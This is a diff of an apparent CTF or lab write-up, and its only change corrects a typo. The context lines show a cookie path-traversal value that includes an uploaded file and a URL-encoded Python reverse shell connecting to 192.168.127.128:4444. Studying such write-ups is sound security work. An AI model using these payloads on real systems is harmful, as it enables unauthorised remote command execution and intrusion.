@@ -216,7 +216,7 @@ lang=../upload/843eb8966ba95af4e3b673970ba8ebe8.png
 ```
 you cand do it by browser storage section or console section by `document.cookie="lang=../upload/843eb8966ba95af4e3b673970ba8ebe8.png"`
 
-and the call the page with `cmd` parameter and a reverse shell, i used pytnhon reverse shell and url encoded it :
+and then call the page with `cmd` parameter and a reverse shell, i used pytnhon reverse shell and url encoded it :
 
 ```python
 python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.127.128%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)'
